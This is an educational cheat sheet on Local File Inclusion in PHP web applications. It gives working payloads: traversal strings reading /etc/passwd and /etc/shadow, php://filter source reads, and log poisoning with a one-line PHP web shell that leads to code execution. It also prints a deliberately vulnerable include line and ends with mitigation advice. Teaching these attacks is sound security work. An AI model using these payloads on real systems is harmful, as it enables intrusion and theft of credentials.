# Local File Inclusion (LFI)

[👉 GUÍA DEFINITIVA de Vulnerabilidad LOCAL FILE INCLUSION (LFI) | Hacking Ético y Ciberseguridad 🥷 - YouTube](https://www.youtube.com/watch?v=3bxxnX15YuU)
## 1. Definition
Local File Inclusion (LFI) is a web vulnerability where an attacker can force the application to load or include files located on the local server.
It happens when user input is used to build file paths without proper validation.

Example vulnerable code:
`include($_GET["page"]);`

Normal usage:
?page=home.php

Malicious usage:
?page=../../../../etc/passwd


## 2. How LFI Works
The application takes user input and concatenates it with a file path. If input is not sanitized, attackers can:

- Read system files
- Read application files
- Sometimes execute code (if certain conditions exist)

Common traversal patterns:
../
..%2f
..%252f
%00 (legacy null byte)


## 3. Common LFI Targets
/etc/passwd
/etc/shadow
/var/log/auth.log
/var/log/apache2/access.log
Application config files
PHP source files


## 4. Exploitation Techniques

### 4.1 Simple File Read
?page=../../../../etc/passwd

### 4.2 Null Byte Injection (Old PHP)
?page=../../../../etc/passwd%00

### 4.3 PHP Filters (Read source code)
?page=php://filter/convert.base64-encode/resource=index.php

### 4.4 Log Poisoning (LFI to RCE)
1. Inject PHP into logs (User-Agent):
<?php system($_GET['cmd']); ?>

2. Include the log file:
?page=../../../../var/log/apache2/access.log

3. Execute:
?page=../../../../var/log/apache2/access.log&cmd=id

### 4.5 Upload Poisoning
1. Upload an image containing PHP code
2. Include the uploaded file:
?page=../../uploads/img.png


## 5. Impact
- Reading sensitive files
- Reading source code
- Directory traversal
- Escalation to RCE via log poisoning, upload poisoning, wrappers
- Access to credentials or keys

Severity: Critical


## 6. Detection Checklist
Test parameters:
file=
page=
template=
view=
include=
module=
dir=
path=

Indicators:
- Errors when using ../
- Different responses depending on traversal depth
- Base64 output with filter wrappers
- Access to log files


## 7. Mitigation
- Use a strict allowlist of files
- Use absolute paths
- Avoid concatenating user input in file paths
- Disable dangerous PHP wrappers
- Harden file permissions
- Disable display_errors in production
